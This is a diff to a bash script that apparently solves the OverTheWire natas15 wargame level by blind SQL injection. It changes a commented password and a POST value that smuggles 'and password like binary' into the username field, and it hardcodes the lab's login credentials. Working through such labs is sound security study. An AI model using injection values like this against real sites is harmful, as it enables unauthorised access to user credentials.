@@ -1,7 +1,7 @@
 #! /bin/bash
 #This user exists.	Executing query: SELECT * from users where username="natas16" and password like "________________________________"
 #pass with 32 symb
-#WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+#WaIHEacj63wnNIBROHeqi3p9t0m5nhm
 
 access="natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
 site="http://natas15.natas.labs.overthewire.org?debug=1"
@@ -35,7 +35,7 @@ site="http://natas15.natas.labs.overthewire.org?debug=1"
 #wild=${wild::-1}
 #done
 
-data='username=natas16" and password like binar"'
+data='username=natas16" and password like binary "'
 wild="_______________________________" 
 
 for ((i=0;i<33;i++))
